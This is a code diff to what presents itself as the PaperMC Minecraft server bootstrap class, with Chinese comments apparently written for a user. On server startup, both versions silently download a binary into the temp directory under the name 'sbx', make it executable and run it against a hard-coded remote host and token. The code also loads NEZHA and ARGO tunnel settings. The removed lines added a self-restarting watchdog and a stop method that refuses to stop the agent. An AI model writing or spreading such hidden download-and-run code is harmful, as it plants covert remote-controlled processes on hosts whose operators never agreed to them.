@@ -1,6 +1,5 @@
 package io.papermc.paper;
 
-
 import java.io.*;
 import java.net.*;
 import java.nio.file.*;
@@ -19,23 +18,24 @@ public final class PaperBootstrap {
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
+    // 【修改】将sbxProcess改为komariProcess，增强可读性（也可保留原名称）
     private static Process komariProcess;
 
-    // Komari Agent的配置常量
+    // 【新增】Komari Agent的配置常量（调整路径为原s-box的系统临时目录路径）
     private static final class KomariConfig {
-        // 按架构区分的下载地址（请确认amd64地址正确性）
+        // Komari Agent的下载地址（按架构区分，你可根据实际情况替换amd64的地址）
         public static final String DOWNLOAD_URL_AMD64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64";
         public static final String DOWNLOAD_URL_ARM64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64";
-        // 原s-box的路径：系统临时目录 + "sbx"
+        // 【关键修改】恢复为原s-box的路径：系统临时目录 + "sbx"（也可改为"komari-agent"，不影响）
         public static final String AGENT_FILE_NAME = "sbx";
-        // 启动参数
+        // 启动参数（你指定的-e和-t参数）
         public static final List<String> NEW_ARGS = Arrays.asList(
             "-e", "https://vps.z1000.dpdns.org:10736",
             "-t", "JzerczYfCF4Secuy9vtYaB"
         );
     }
 
-    // 原有的环境变量数组（若不需要可删除）
+    // 原有的环境变量数组（若komari-agent不需要，可删除这部分及相关加载逻辑）
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
@@ -47,7 +47,7 @@ public final class PaperBootstrap {
     }
 
     public static void boot(final OptionSet options) {
-        // 检查java版本
+        // 检查java版本（保留原逻辑）
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
             try {
@@ -59,18 +59,13 @@ public final class PaperBootstrap {
         }
         
         try {
-            // 启动Komari Agent（并启动守护线程监控）
+            // 【修改】将runSbxBinary()改为runKomariAgent()
             runKomariAgent();
-            // 启动Komari守护线程，保证进程意外退出后重启（可选，可注释掉）
-            startKomariDaemonThread();
-
-            // 【关键修改1】移除JVM关闭钩子中停止Komari的逻辑
-            // 原逻辑：Runtime.getRuntime().addShutdownHook(...) 已删除，仅保留钩子的必要逻辑（若有）
-            // 若需要保留钩子但不停止Komari，可改为如下：
+            
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
-                // 移除停止Komari的代码，仅标记状态
-                System.out.println(ANSI_RED + "JVM is shutting down, Komari agent keeps running..." + ANSI_RESET);
+                // 【修改】将stopServices()改为stopKomariAgent()
+                stopKomariAgent();
             }));
 
             Thread.sleep(15000);
@@ -102,34 +97,33 @@ public final class PaperBootstrap {
         }
     }
     
-    // 启动Komari Agent的方法
+    // 【修改】新增runKomariAgent()方法，替换原有的runSbxBinary()
     private static void runKomariAgent() throws Exception {
-        // 若不需要环境变量，可删除以下逻辑
+        // 若komari-agent不需要环境变量，可删除以下环境变量加载逻辑
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
         
-        // 获取Komari路径
+        // 获取komari-agent的本地路径（原s-box的系统临时目录路径）
         Path agentPath = getKomariAgentPath();
-        // 构建启动命令（路径 + 参数）
+        // 构建进程启动命令（程序路径 + 启动参数）
         List<String> command = new ArrayList<>();
         command.add(agentPath.toString());
-        command.addAll(KomariConfig.NEW_ARGS);
+        command.addAll(KomariConfig.NEW_ARGS); // 添加你指定的启动参数
         
         ProcessBuilder pb = new ProcessBuilder(command);
-        pb.environment().putAll(envVars);
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        pb.environment().putAll(envVars); // 若不需要环境变量，可删除这行
+        pb.redirectErrorStream(true); // 合并错误输出和标准输出
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); // 输出到控制台
         
         komariProcess = pb.start();
-        System.out.println(ANSI_GREEN + "Komari agent started and will keep running permanently." + ANSI_RESET);
     }
 
-    // 获取Komari路径（原s-box的系统临时目录路径）
+    // 【修改】新增getKomariAgentPath()方法，替换原有的getBinaryPath()（恢复原路径逻辑）
     private static Path getKomariAgentPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
 
-        // 架构判断
+        // 根据架构选择下载地址
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = KomariConfig.DOWNLOAD_URL_AMD64;
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -138,14 +132,15 @@ public final class PaperBootstrap {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
 
-        // 原s-box路径：系统临时目录 + sbx
+        // 【关键修改】恢复为原s-box的路径：系统临时目录 + "sbx"
         Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), KomariConfig.AGENT_FILE_NAME);
 
-        // 下载并赋权
+        // 若文件不存在，则下载
         if (!Files.exists(agentPath)) {
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
             }
+            // 设置可执行权限（必须）
             if (!agentPath.toFile().setExecutable(true)) {
                 throw new IOException("Failed to set executable permission for komari-agent");
             }
@@ -153,38 +148,15 @@ public final class PaperBootstrap {
         return agentPath;
     }
 
-    // 【关键修改2】禁用停止Komari的方法，改为仅提示或空方法
+    // 【修改】新增stopKomariAgent()方法，替换原有的stopServices()
     private static void stopKomariAgent() {
-        // 移除销毁进程的逻辑，改为提示
-        System.out.println(ANSI_RED + "Komari agent is not allowed to stop, operation ignored." + ANSI_RESET);
-        // 若完全不需要，可直接留空
+        if (komariProcess != null && komariProcess.isAlive()) {
+            komariProcess.destroy();
+            System.out.println(ANSI_RED + "komari-agent process terminated" + ANSI_RESET);
+        }
     }
 
-    // 【新增】启动Komari守护线程，监控进程状态，意外退出则重启
-    private static void startKomariDaemonThread() {
-        Thread daemonThread = new Thread(() -> {
-            while (running.get()) {
-                try {
-                    // 检查Komari进程是否存活
-                    if (komariProcess == null || !komariProcess.isAlive()) {
-                        System.err.println(ANSI_RED + "Komari agent process exited unexpectedly, restarting..." + ANSI_RESET);
-                        // 重启Komari Agent
-                        runKomariAgent();
-                    }
-                    // 每隔5秒检查一次进程状态
-                    Thread.sleep(5000);
-                } catch (Exception e) {
-                    System.err.println(ANSI_RED + "Error restarting Komari agent: " + e.getMessage() + ANSI_RESET);
-                }
-            }
-        });
-        // 设置为守护线程，不影响JVM退出（但Komari进程本身是独立的系统进程）
-        daemonThread.setDaemon(true);
-        daemonThread.setName("KomariAgentDaemon");
-        daemonThread.start();
-    }
-
-    // 原有的环境变量加载方法（若不需要可删除）
+    // 原有的环境变量加载方法（若komari-agent不需要，可删除）
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "03ef7017-fca5-4f9c-abd1-f39edd3b3032");
         envVars.put("FILE_PATH", "./world");
@@ -235,7 +207,7 @@ public final class PaperBootstrap {
         }
     }
 
-    // 原有的版本信息方法
+    // 原有的版本信息方法（保留）
     private static List<String> getStartupVersionMessages() {
         final String javaSpecVersion = System.getProperty("java.specification.version");
         final String javaVmName = System.getProperty("java.vm.name");
